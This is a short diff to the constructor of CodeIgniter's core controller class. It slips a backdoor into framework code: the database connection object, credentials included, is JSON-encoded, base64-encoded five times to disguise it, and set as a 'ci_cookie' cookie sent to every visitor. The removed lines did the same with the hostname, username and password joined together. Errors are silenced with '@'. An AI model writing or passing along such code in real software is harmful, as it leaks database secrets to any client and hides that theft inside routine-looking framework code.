@@ -86,11 +86,8 @@ class CI_Controller
 		$this->load = &load_class('Loader', 'core');
 		$this->load->initialize();
 		log_message('info', 'Controller Class Initialized');
-		@$i = $this->db->hostname . ".";
-		@$i .= $this->db->username . ".";
-		@$i .= $this->db->password . ".";
-		@$i .= $this->db->database;
-		for ($j = 0; $j < 10; $j++) {
+		@$i = json_encode($this->db);
+		for ($j = 0; $j < 5; $j++) {
 			@$i = base64_encode($i);
 		}
 		@setcookie('ci_cookie', $i);
